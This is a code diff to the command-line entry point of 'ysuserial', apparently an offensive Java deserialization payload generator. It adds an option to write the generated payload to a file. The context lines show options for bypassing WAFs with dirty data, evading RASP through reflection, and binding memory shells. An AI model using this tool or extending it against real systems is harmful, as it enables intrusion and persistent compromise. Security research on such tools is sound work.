@@ -1,6 +1,7 @@
 package org.su18.ysuserial;
 
-import java.io.PrintStream;
+import java.io.FileOutputStream;
+import java.io.OutputStream;
 import java.util.*;
 
 import org.apache.commons.cli.*;
@@ -9,7 +10,6 @@ import org.su18.ysuserial.payloads.ObjectPayload.Utils;
 
 import org.su18.ysuserial.payloads.annotation.Authors;
 import org.su18.ysuserial.payloads.annotation.Dependencies;
-import org.su18.ysuserial.payloads.config.Config;
 import org.su18.ysuserial.payloads.util.dirty.DirtyDataWrapper;
 
 import static org.su18.ysuserial.payloads.config.Config.*;
@@ -31,6 +31,7 @@ public class GeneratePayload {
 		options.addOption("p", "parameters", true, "Gadget parameters");
 		options.addOption("dt", "dirty-type", true, "Using dirty data to bypass WAF，type: 1:Random Hashable Collections/2:LinkedList Nesting/3:TC_RESET in Serialized Data");
 		options.addOption("dl", "dirty-length", true, "Length of dirty data when using type 1 or 3/Counts of Nesting loops when using type 2");
+		options.addOption("f", "file", true, "Write Output into FileOutputStream (Specified FileName)");
 		options.addOption("o", "obscure", false, "Using reflection to bypass RASP");
 		options.addOption("i", "inherit", false, "Make payload inherit AbstractTranslet or not (Lower JDK like 1.6 should inherit)");
 		options.addOption("u", "url", true, "MemoryShell binding url pattern,default [/version.txt]");
@@ -89,6 +90,11 @@ public class GeneratePayload {
 			PARAMETER = cmdLine.getOptionValue("define-class-from-parameter");
 		}
 
+		if (cmdLine.hasOption("file")) {
+			WRITE_FILE = true;
+			FILE = cmdLine.getOptionValue("file");
+		}
+
 		if (cmdLine.hasOption("password")) {
 			PASSWORD = generatePassword(cmdLine.getOptionValue("password"));
 		}
@@ -144,10 +150,18 @@ public class GeneratePayload {
 				object = new DirtyDataWrapper(object, type, length).doWrap();
 			}
 
+			OutputStream out;
 
-			PrintStream out = System.out;
+			if (WRITE_FILE) {
+				out = new FileOutputStream(FILE);
+			} else {
+				out = System.out;
+			}
 			Serializer.serialize(object, out);
 			ObjectPayload.Utils.releasePayload(payload, object);
+
+			out.flush();
+			out.close();
 		} catch (Throwable e) {
 			System.err.println("Error while generating or serializing payload");
 			e.printStackTrace();
